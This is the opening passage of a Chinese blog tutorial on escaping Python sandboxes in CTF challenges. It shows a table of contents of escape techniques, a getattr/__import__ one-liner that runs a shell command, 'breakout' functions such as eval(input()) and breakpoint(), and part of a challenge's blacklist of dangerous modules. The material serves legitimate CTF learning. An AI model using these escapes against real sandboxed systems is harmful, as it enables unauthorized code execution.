<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/logo.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/logo.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"ayan0.top","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.24.1","exturl":false,"sidebar":{"position":"left","width_expanded":280,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":false,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":"mac"},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>

    <meta name="description" content="浅浅记一下无处不在的沙箱逃逸 这个东西还是要搭配例题的嗯嗯  沙箱逃逸从入门到放弃">
<meta property="og:type" content="article">
<meta property="og:title" content="沙箱逃逸">
<meta property="og:url" content="https://ayan0.top/2025/05/05/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/">
<meta property="og:site_name" content="Blog of AyaN0">
<meta property="og:description" content="浅浅记一下无处不在的沙箱逃逸 这个东西还是要搭配例题的嗯嗯  沙箱逃逸从入门到放弃">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250703102411030.png">
<meta property="og:image" content="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250506102803052.png">
<meta property="og:image" content="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250506102848722.png">
<meta property="og:image" content="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250603194452776.png">
<meta property="og:image" content="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250704170021243.png">
<meta property="og:image" content="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250703093113593.png">
<meta property="og:image" content="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250703094342023.png">
<meta property="og:image" content="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250703094649462.png">
<meta property="article:published_time" content="2025-05-05T08:13:51.000Z">
<meta property="article:modified_time" content="2025-08-05T09:49:14.025Z">
<meta property="article:author" content="AyaN0">
<meta property="article:tag" content="-Web">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250703102411030.png">


<link rel="canonical" href="https://ayan0.top/2025/05/05/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/">


<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://ayan0.top/2025/05/05/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/","path":"2025/05/05/沙箱逃逸/","title":"沙箱逃逸"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>沙箱逃逸 | Blog of AyaN0</title>
  








  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.5.0/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
<script src="/js/third-party/search/local-search.js" defer></script>







  
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>





  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">
      <img class="custom-logo-image" src="/images/lly.jpg" alt="Blog of AyaN0">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">Blog of AyaN0</p>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="搜索" role="button">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
      <div class="search-header">
        <span class="search-icon">
          <i class="fa fa-search"></i>
        </span>
        <div class="search-input-container">
          <input autocomplete="off" autocapitalize="off" maxlength="80"
                placeholder="搜索..." spellcheck="false"
                type="search" class="search-input">
        </div>
        <span class="popup-btn-close" role="button">
          <i class="fa fa-times-circle"></i>
        </span>
      </div>
      <div class="search-result-container">
        <div class="search-result-icon">
          <i class="fa fa-spinner fa-pulse fa-5x"></i>
        </div>
      </div>
    </div>
  </div>

</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83"><span class="nav-number">1.</span> <span class="nav-text"> 沙箱逃逸从入门到放弃</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#pyjail"><span class="nav-number">1.1.</span> <span class="nav-text"> Pyjail</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%A5%9E%E5%BF%85%E5%B0%8F%E5%B8%AE%E6%89%8B"><span class="nav-number">1.1.1.</span> <span class="nav-text"> 神必小帮手</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#dir"><span class="nav-number">1.1.1.1.</span> <span class="nav-text"> dir()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#__dict__"><span class="nav-number">1.1.1.2.</span> <span class="nav-text"> __dict__</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#getattr"><span class="nav-number">1.1.1.3.</span> <span class="nav-text"> getattr()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#__getattribute__"><span class="nav-number">1.1.1.4.</span> <span class="nav-text"> __getattribute__</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#__getitem__"><span class="nav-number">1.1.1.5.</span> <span class="nav-text"> __getitem__</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%A0%B4%E5%A3%81%E5%87%BD%E6%95%B0"><span class="nav-number">1.1.1.6.</span> <span class="nav-text"> &quot;破壁&quot;函数</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A6%99%E6%89%8B%E5%9B%9E%E6%98%A5self-builtins"><span class="nav-number">1.1.2.</span> <span class="nav-text"> 妙手回春(self builtins)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%A7%E6%89%BF%E9%93%BEno-builtins"><span class="nav-number">1.1.3.</span> <span class="nav-text"> 继承链(no builtins)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A0%88%E5%B8%A7%E9%80%83%E9%80%B8"><span class="nav-number">1.1.4.</span> <span class="nav-text"> 栈帧逃逸</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%94%9F%E6%88%90%E5%99%A8%E6%A0%88%E5%B8%A7%E9%80%83%E9%80%B8"><span class="nav-number">1.1.4.1.</span> <span class="nav-text"> 生成器栈帧逃逸</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%BC%82%E5%B8%B8%E6%A0%88%E5%B8%A7%E9%80%83%E9%80%B8"><span class="nav-number">1.1.4.2.</span> <span class="nav-text"> 异常栈帧逃逸</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%BC%82%E6%AD%A5%E6%A0%88%E5%B8%A7%E9%80%83%E9%80%B8"><span class="nav-number">1.1.4.3.</span> <span class="nav-text"> 异步栈帧逃逸</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E4%B8%8E%E5%87%BD%E6%95%B0%E7%AF%A1%E6%94%B9"><span class="nav-number">1.1.5.</span> <span class="nav-text"> 变量覆盖与函数篡改</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8-gc-%E8%8E%B7%E5%8F%96%E5%B7%B2%E5%88%A0%E9%99%A4%E6%A8%A1%E5%9D%97"><span class="nav-number">1.1.5.1.</span> <span class="nav-text"> 利用 gc 获取已删除模块</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8-traceback-%E8%8E%B7%E5%8F%96%E6%A8%A1%E5%9D%97"><span class="nav-number">1.1.5.2.</span> <span class="nav-text"> 利用 traceback 获取模块</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A8%A1%E5%9D%97%E9%87%8D%E8%BD%BD%E5%8E%9Fmodule%E8%A2%AB%E7%AF%A1%E6%94%B9"><span class="nav-number">1.1.6.</span> <span class="nav-text"> 模块重载(原module被篡改)</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#reload-%E9%87%8D%E6%96%B0%E5%8A%A0%E8%BD%BD"><span class="nav-number">1.1.6.1.</span> <span class="nav-text"> reload 重新加载</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%81%A2%E5%A4%8D-sysmodules"><span class="nav-number">1.1.6.2.</span> <span class="nav-text"> 恢复 sys.modules</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#globals"><span class="nav-number">1.1.6.3.</span> <span class="nav-text"> globals()</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ast"><span class="nav-number">1.1.7.</span> <span class="nav-text"> AST</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#without-call"><span class="nav-number">1.1.7.1.</span> <span class="nav-text"> without call</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%A3%85%E9%A5%B0%E5%99%A8"><span class="nav-number">1.1.7.1.1.</span> <span class="nav-text"> 装饰器</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%87%BD%E6%95%B0%E8%A6%86%E7%9B%96"><span class="nav-number">1.1.7.1.2.</span> <span class="nav-text"> 函数覆盖</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E9%80%9A%E8%BF%87-license-%E5%87%BD%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6"><span class="nav-number">1.1.7.1.3.</span> <span class="nav-text"> 通过 license 函数读取文件</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%89%93%E5%8D%B0-ast"><span class="nav-number">1.1.7.2.</span> <span class="nav-text"> 打印 AST</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BB%95%E8%BF%87-astattribute-%E8%8E%B7%E5%8F%96%E5%B1%9E%E6%80%A7"><span class="nav-number">1.1.7.3.</span> <span class="nav-text"> 绕过 ast.Attribute 获取属性</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BB%95%E8%BF%87-astassign-%E8%B5%8B%E5%80%BC%E5%8F%98%E9%87%8F"><span class="nav-number">1.1.7.4.</span> <span class="nav-text"> 绕过 ast.Assign 赋值变量</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BB%95%E8%BF%87-astconstant-%E8%8E%B7%E5%8F%96%E6%95%B0%E5%AD%97-%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="nav-number">1.1.7.5.</span> <span class="nav-text"> 绕过 ast.Constant 获取数字、字符串</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BB%95%E8%BF%87-astsubscript-%E8%8E%B7%E5%8F%96%E5%88%97%E8%A1%A8%E5%AD%97%E5%85%B8%E5%85%83%E7%B4%A0"><span class="nav-number">1.1.7.6.</span> <span class="nav-text"> 绕过 ast.Subscript 获取列表&#x2F;字典元素</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BB%95%E8%BF%87-astfor-%E9%81%8D%E5%8E%86%E5%88%97%E8%A1%A8"><span class="nav-number">1.1.7.7.</span> <span class="nav-text"> 绕过 ast.For 遍历列表</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BB%95%E8%BF%87astgeneratorexp%E8%8E%B7%E5%8F%96%E7%94%9F%E6%88%90%E5%99%A8%E6%A0%88%E5%B8%A7"><span class="nav-number">1.1.7.8.</span> <span class="nav-text"> 绕过ast.GeneratorExp获取生成器栈帧</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#opcode"><span class="nav-number">1.1.8.</span> <span class="nav-text"> OPcode</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#import_from-load_attr-%E7%9B%B8%E4%BA%92%E6%9B%BF%E6%8D%A2"><span class="nav-number">1.1.8.1.</span> <span class="nav-text"> IMPORT_FROM、LOAD_ATTR 相互替换</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#load_name-load_attr"><span class="nav-number">1.1.8.2.</span> <span class="nav-text"> LOAD_NAME &amp; LOAD_ATTR</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#import_name-import_from"><span class="nav-number">1.1.8.3.</span> <span class="nav-text"> IMPORT_NAME &amp; IMPORT_FROM</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9B%BF%E6%8D%A2%E5%AD%97%E8%8A%82%E7%A0%81"><span class="nav-number">1.1.8.4.</span> <span class="nav-text"> 替换字节码</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%97%A0%E5%9B%9E%E6%98%BE"><span class="nav-number">1.1.9.</span> <span class="nav-text"> 无回显</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86"><span class="nav-number">1.1.9.1.</span> <span class="nav-text"> 利用异常处理</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#keyerror"><span class="nav-number">1.1.9.1.1.</span> <span class="nav-text"> KeyError</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#filenotfounderror"><span class="nav-number">1.1.9.1.2.</span> <span class="nav-text"> FileNotFoundError</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#valueerror"><span class="nav-number">1.1.9.1.3.</span> <span class="nav-text"> ValueError</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#popenreturncode"><span class="nav-number">1.1.9.1.4.</span> <span class="nav-text"> Popen.returncode</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%92%A9%E5%AD%90%E7%88%B9%E6%9D%A5%E5%92%AF"><span class="nav-number">1.1.10.</span> <span class="nav-text"> 钩子爹来咯!</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%AF%A1%E6%94%B9%E5%86%85%E7%BD%AE%E5%87%BD%E6%95%B0"><span class="nav-number">1.1.10.1.</span> <span class="nav-text"> 篡改内置函数</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B9%B1%E4%B8%83%E5%85%AB%E7%B3%9F%E7%9A%84waf"><span class="nav-number">1.1.11.</span> <span class="nav-text"> 乱七八糟的WAF</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4import"><span class="nav-number">1.1.11.1.</span> <span class="nav-text"> 过滤import</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E5%AD%97%E6%AF%8D"><span class="nav-number">1.1.11.2.</span> <span class="nav-text"> 过滤字母</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E5%B1%9E%E6%80%A7"><span class="nav-number">1.1.11.3.</span> <span class="nav-text"> 过滤属性</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%A1%8C%E6%95%B0%E9%99%90%E5%88%B6"><span class="nav-number">1.1.11.4.</span> <span class="nav-text"> 行数限制</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#exec"><span class="nav-number">1.1.11.4.1.</span> <span class="nav-text"> exec</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#compile"><span class="nav-number">1.1.11.4.2.</span> <span class="nav-text"> compile</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%B5%B7%E8%B1%A1%E8%A1%A8%E8%BE%BE%E5%BC%8F"><span class="nav-number">1.1.11.4.3.</span> <span class="nav-text"> 海象表达式</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6"><span class="nav-number">1.1.11.5.</span> <span class="nav-text"> 长度限制</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%89%93%E5%BC%80-input-%E8%BE%93%E5%85%A5"><span class="nav-number">1.1.11.5.1.</span> <span class="nav-text"> 打开 input 输入</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#breakpoint-%E5%87%BD%E6%95%B0"><span class="nav-number">1.1.11.5.2.</span> <span class="nav-text"> breakpoint 函数</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#help-%E5%87%BD%E6%95%B0"><span class="nav-number">1.1.11.5.3.</span> <span class="nav-text"> help 函数</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#vm%E9%80%83%E9%80%B8"><span class="nav-number">1.2.</span> <span class="nav-text"> vm逃逸</span></a></li></ol></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="AyaN0"
      src="/images/lly.jpg">
  <p class="site-author-name" itemprop="name">AyaN0</p>
  <div class="site-description" itemprop="description">不断的前进的人:只有0次摔倒或无数次的爬起</div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">28</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
        <span class="site-state-item-count">1</span>
        <span class="site-state-item-name">分类</span>
      </div>
      <div class="site-state-item site-state-tags">
        <span class="site-state-item-count">19</span>
        <span class="site-state-item-name">标签</span>
      </div>
  </nav>
</div>
  <div class="links-of-author animated">
      <span class="links-of-author-item">
        <a href="https://github.com/kisakiayano" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;kisakiayano" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="/1594453512@qq.com" title="E-Mail → 1594453512@qq.com" rel="noopener me"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
  </div>

        </div>
      </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://ayan0.top/2025/05/05/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/lly.jpg">
      <meta itemprop="name" content="AyaN0">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Blog of AyaN0">
      <meta itemprop="description" content="不断的前进的人:只有0次摔倒或无数次的爬起">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="沙箱逃逸 | Blog of AyaN0">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          沙箱逃逸
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2025-05-05 16:13:51" itemprop="dateCreated datePublished" datetime="2025-05-05T16:13:51+08:00">2025-05-05</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2025-08-05 17:49:14" itemprop="dateModified" datetime="2025-08-05T17:49:14+08:00">2025-08-05</time>
    </span>

  
    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
      <span class="post-meta-item-icon">
        <i class="far fa-eye"></i>
      </span>
      <span class="post-meta-item-text">阅读次数：</span>
      <span id="busuanzi_value_page_pv"></span>
    </span>
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>39k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>1:11</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody"><p>浅浅记一下无处不在的沙箱逃逸</p>
<p>这个东西还是要搭配例题的嗯嗯</p>
<h1 id="沙箱逃逸从入门到放弃"><a class="markdownIt-Anchor" href="#沙箱逃逸从入门到放弃"></a> 沙箱逃逸从入门到放弃</h1>
<h2 id="pyjail"><a class="markdownIt-Anchor" href="#pyjail"></a> <code>Pyjail</code></h2>
<p><code>misc</code>手也能学会<s>必须学会</s>的小技巧</p>
<p>先介绍一些不太常规的再介绍常规的吧(密码的现在沙箱哪里还有常规的。。。)</p>
<p>先看一些进行信息收集的函数，信息收集完成后才好确定逃逸方向</p>
<h3 id="神必小帮手"><a class="markdownIt-Anchor" href="#神必小帮手"></a> 神必小帮手</h3>
<h4 id="dir"><a class="markdownIt-Anchor" href="#dir"></a> dir()</h4>
<pre><code class="highlight plaintext">dir()可以用于查看可用的内置函数</code></pre>
<p>主要是用来找作为利用点的函数</p>
<h4 id="__dict__"><a class="markdownIt-Anchor" href="#__dict__"></a> <code>__dict__</code></h4>
<p>一键查属性</p>
<p><code>m.x</code>等同于<code>m.__dict__[“x”]</code>,我们就可以用一些编码来绕过字符明文检<code>m.x</code>等同于<code>m.__dict__[“x”]</code>,我们就可以用一些编码来绕过字符明文检测</p>
<h4 id="getattr"><a class="markdownIt-Anchor" href="#getattr"></a> <code>getattr()</code></h4>
<p>看看你的属性呢，可以引入模块来执行命令，有种opcode的即视感(雾)</p>
<pre><code class="highlight plaintext">getattr(__import__(&#x27;os&#x27;),&quot;system&quot;)(&#x27;whoami&#x27;)</code></pre>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250703102411030.png" alt="image-20250703102411030"></p>
<h4 id="__getattribute__"><a class="markdownIt-Anchor" href="#__getattribute__"></a> <code>__getattribute__</code></h4>
<p>对象的内置方法，用于在访问对象的任意对象时自动调用</p>
<p>这是一个低级别的钩子，用于拦截属性访问，可以对其进行<code>重载</code>以<code>自定义属性访问行为</code>。</p>
<pre><code class="highlight plaintext">在调用时，一般都是__getattibute__先被调用，当抛出AttributeError 异常时，__getattr__ 才会被调用。
另外，所有的类都会有__getattribute__属性，而不一定有__getattr__属性</code></pre>
<h4 id="__getitem__"><a class="markdownIt-Anchor" href="#__getitem__"></a> <code>__getitem__</code></h4>
<p><code>__getitem__</code>方法适用于获取元素</p>
<p>当使用<code>obj[key]</code>这样的操作时，python就会自动调用它</p>
<p>这里的key可以是整数索引也可以是其他能当&quot;标签&quot;的键</p>
<p>而你可以用get方法来获得键的值</p>
<h4 id="破壁函数"><a class="markdownIt-Anchor" href="#破壁函数"></a> &quot;破壁&quot;函数</h4>
<pre><code class="highlight plaintext">eval(input())
help()
breakpoint()
sh</code></pre>
<h3 id="妙手回春self-builtins"><a class="markdownIt-Anchor" href="#妙手回春self-builtins"></a> 妙手回春(self builtins)</h3>
<p>有时沙箱中会用<code>exec</code>限制你的命名空间</p>
<p>因为<code>exec</code>的第二个参数是可以自定义的，通过修改，删除命名空间里的函数就达到了限制你操作的效果，例子来源于 iscc_2016_pycalc</p>
<pre><code class="highlight plaintext">def _hook_import_(name, *args, **kwargs):
    module_blacklist = [&#x27;os&#x27;, &#x27;sys&#x27;, &#x27;time&#x27;, &#x27;bdb&#x27;, &#x27;bsddb&#x27;, &#x27;cgi&#x27;,
                        &#x27;CGIHTTPServer&#x27;, &#x27;cgitb&#x27;, &#x27;compileall&#x27;, &#x27;ctypes&#x27;, &#x27;dircache&#x27;,
                        &#x27;doctest&#x27;, &#x27;dumbdbm&#x27;, &#x27;filecmp&#x27;, &#x27;fileinput&#x27;, &#x27;ftplib&#x27;, &#x27;gzip&#x27;,
                        &#x27;getopt&#x27;, &#x27;getpass&#x27;, &#x27;gettext&#x27;, &#x27;httplib&#x27;, &#x27;importlib&#x27;, &#x27;imputil&#x27;,
                        &#x27;linecache&#x27;, &#x27;macpath&#x27;, &#x27;mailbox&#x27;, &#x27;mailcap&#x27;, &#x27;mhlib&#x27;, &#x27;mimetools&#x27;,
                        &#x27;mimetypes&#x27;, &#x27;modulefinder&#x27;, &#x27;multiprocessing&#x27;, &#x27;netrc&#x27;, &#x27;new&#x27;,
                        &#x27;optparse&#x27;, &#x27;pdb&#x27;, &#x27;pipes&#x27;, &#x27;pkgutil&#x27;, &#x27;platform&#x27;, &#x27;popen2&#x27;, &#x27;poplib&#x27;,
                        &#x27;posix&#x27;, &#x27;posixfile&#x27;, &#x27;profile&#x27;, &#x27;pstats&#x27;, &#x27;pty&#x27;, &#x27;py_compile&#x27;,
                        &#x27;pyclbr&#x27;, &#x27;pydoc&#x27;, &#x27;rexec&#x27;, &#x27;runpy&#x27;, &#x27;shlex&#x27;, &#x27;shutil&#x27;, &#x27;SimpleHTTPServer&#x27;,
                        &#x27;SimpleXMLRPCServer&#x27;, &#x27;site&#x27;, &#x27;smtpd&#x27;, &#x27;socket&#x27;, &#x27;SocketServer&#x27;,
                        &#x27;subprocess&#x27;, &#x27;sysconfig&#x27;, &#x27;tabnanny&#x27;, &#x27;tarfile&#x27;, &#x27;telnetlib&#x27;,
                        &#x27;tempfile&#x27;, &#x27;Tix&#x27;, &#x27;trace&#x27;, &#x27;turtle&#x27;, &#x27;urllib&#x27;, &#x27;urllib2&#x27;,
